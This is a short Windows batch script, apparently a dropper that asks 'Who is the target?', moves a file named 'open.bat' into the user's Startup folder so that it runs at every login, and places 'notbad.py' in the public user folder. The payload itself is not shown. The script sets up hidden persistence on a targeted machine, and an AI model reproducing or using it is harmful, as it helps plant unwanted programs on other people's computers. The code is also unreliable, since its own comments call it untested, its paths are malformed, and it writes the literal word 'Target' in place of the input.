:: Expect user to put everything in the Desktop
::  After that, when the script is run, it will move
::  `open.bat` to
::    %appdata%\Roaming\Microsoft\Windows
::        \StartMenu\Programs\Startup\open.bat
::  Then, move `notbad.py` to C:\Users\Public\notbad.py
:: This script has not been tested
color green

set /p Target=Who is the target?
echo Target>C:\Users\Public\target.txt

move open.bat C:\%USERNAME%\Roaming\Microsoft\Windows\StartMenu\Programs\Startup\open.bat
move notbad.py C:\Users\Public\notbad.py
